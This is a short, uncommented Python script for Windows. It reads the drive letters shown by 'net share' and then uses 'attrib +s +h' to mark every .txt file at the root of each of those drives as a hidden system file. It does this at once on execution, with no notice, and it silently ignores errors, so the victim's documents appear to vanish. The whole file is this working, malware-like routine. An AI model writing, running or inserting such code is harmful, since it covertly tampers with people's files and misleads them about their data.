import subprocess as sub


passwand = ["txt"]
sys_drive=[]

def Find_Drive():
     drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]

     cmd = sub.check_output("net share",shell=True).decode()
     
     for i in drive:
         if i in str(cmd):
             sys_drive.append(i)


def Hidden():
     for i in sys_drive:
          for j in passwand:
               try:
                    sub.check_output("attrib "+i+"\\"+"*."+j+" +s +h", shell=True)
               except:
                    pass


Find_Drive()
Hidden()

